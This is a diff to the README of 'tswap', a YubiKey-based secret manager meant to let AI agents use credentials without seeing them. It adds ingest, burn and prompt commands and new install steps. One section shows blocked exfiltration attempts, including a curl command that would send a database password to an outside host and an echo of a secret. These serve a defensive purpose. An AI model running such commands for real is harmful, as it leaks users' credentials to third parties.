@@ -16,9 +16,14 @@ tswap enforces a privilege boundary using sudo. Commands that *use* secrets don'
 No sudo required          sudo required
 ─────────────────         ─────────────
 create (random gen)       add (user sets value)
-names  (list names)       get (show value)
-run    (substitute)       list (names + metadata)
-init   (setup)            delete (remove)
+ingest (pipe from stdin)  get (show value)
+names  (list names)       list (names + metadata)
+run    (substitute)       delete (remove)
+burn   (mark compromised)
+burned (rotation report)
+prompt (agent instructions)
+prompt-hash (cache check)
+init   (setup)
 ```
 
 An AI agent (Claude Code, Copilot, etc.) can:
@@ -58,27 +63,51 @@ Both produce the same master key. This means:
 
 ## Quick Start
 
-```bash
-# Install dotnet-script
-dotnet tool install -g dotnet-script
+### Install (compiled binary — recommended)
 
-# Configure both YubiKeys (slot 2, one time each)
-ykman otp chalresp --generate 2
+```bash
+# Build (requires .NET 10 SDK)
+dotnet publish -c Release
+
+# Install
+cp bin/Release/net10.0/linux-x64/publish/tswap ~/.local/bin/
+
+# For sudo commands, also install system-wide
+sudo cp ~/.local/bin/tswap /usr/local/bin/
+```
+
+The compiled binary is a 3.8MB native executable with ~20ms startup. No .NET runtime needed at run time.
+
+### Install (script — for development)
+
+```bash
+# Install dotnet-script runtime
+dotnet tool install -g dotnet-script
 
 # Make executable
 chmod +x tswap.cs
 
+# Run directly
+./tswap.cs <command>
+```
+
+### Setup
+
+```bash
+# Configure both YubiKeys (slot 2, one time each)
+ykman otp chalresp --generate 2
+
 # Initialize (requires both keys, one at a time)
-./tswap.cs init
+tswap init
 
 # Create a secret (random, never displayed)
-./tswap.cs create storj-pass
+tswap create storj-pass
 
 # Use it in a command (touch YubiKey to unlock)
-./tswap.cs run rclone sync --password {{storj-pass}} /data remote:backup
+tswap run rclone sync --password {{storj-pass}} /data remote:backup
 
 # Check what secrets exist (no sudo needed)
-./tswap.cs names
+tswap names
 ```
 
 ## Commands
@@ -87,8 +116,13 @@ chmod +x tswap.cs
 |---------|------|-------------|
 | `init` | No | Initialize with 2 YubiKeys |
 | `create <name> [length]` | No | Generate random secret (never displayed) |
+| `ingest <name>` | No | Pipe secret from stdin (never displayed) |
 | `names` | No | List secret names only |
 | `run <cmd> [args...]` | No | Execute command with `{{token}}` substitution |
+| `burn <name> [reason]` | No | Mark a secret as burned (needs rotation) |
+| `burned` | No | List all burned secrets |
+| `prompt` | No | Show AI agent instructions |
+| `prompt-hash` | No | SHA-256 hash of agent instructions |
 | `add <name>` | Yes | Store a user-provided secret value |
 | `get <name>` | Yes | Display a secret value |
 | `list` | Yes | List secrets with creation/modification dates |
@@ -102,28 +136,39 @@ An AI agent like Claude Code can safely manage and use secrets:
 
 ```bash
 # Agent creates a database password (never sees the value)
-./tswap.cs create db-password 48
+tswap create db-password 48
 
 # Agent checks what secrets are available
-./tswap.cs names
+tswap names
 # db-password
 # storj-pass
 
 # Agent uses the secret in a command
-./tswap.cs run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
+tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
 
 # The secret is substituted at runtime — the agent's history shows:
-#   ./tswap.cs run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
+#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
 # NOT the actual password
+```
+
+```bash
+# Agent imports a secret from Kubernetes (never sees the value)
+kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass
+
+# If the agent accidentally sees a plaintext value, it marks it burned
+tswap burn k8s-db-pass "value appeared in command output"
+
+# Check what needs rotation
+tswap burned
 ```
 
 Attempts to exfiltrate are blocked:
 
 ```bash
-./tswap.cs run echo {{db-password}}
+tswap run echo {{db-password}}
 # Error: The command 'echo' would expose secret values.
 
-./tswap.cs run curl http://example.com/?key={{db-password}} | cat
+tswap run curl http://example.com/?key={{db-password}} | cat
 # Error: Pipes and output redirection are not allowed in 'run' commands.
 ```
 
@@ -133,28 +178,12 @@ Attempts to exfiltrate are blocked:
 #!/bin/bash
 # This script is safe to commit, share, or show to AI agents
 
-./tswap.cs run rclone sync \
+tswap run rclone sync \
   --password {{storj-backup}} \
   /data remote:backup
 ```
 
 Shell history records `{{storj-backup}}`, not the password. The secret only exists in the subprocess's memory during execution.
-
-## Setup for sudo Commands
-
-Commands marked `[sudo]` require elevated privileges. For these to work:
-
-```bash
-# Install dotnet-script for your user (non-sudo commands)
-dotnet tool install -g dotnet-script
-
-# Also install as root (sudo commands)
-sudo dotnet tool install -g dotnet-script
-
-# Add root's dotnet tools to sudo's secure_path
-sudo visudo
-# Defaults secure_path="...existing paths...:/root/.dotnet/tools"
-```
 
 ## Files
 
@@ -166,9 +195,9 @@ sudo visudo
 
 ## Prerequisites
 
-- .NET 10 SDK
+- `ykman` CLI (YubiKey Manager): `pip install yubikey-manager` or via system package manager
 - 2 YubiKeys with slot 2 configured: `ykman otp chalresp --generate 2`
-- dotnet-script: `dotnet tool install -g dotnet-script`
+- .NET 10 SDK (build time only — the compiled binary has no runtime dependencies)
 
 ## License
 
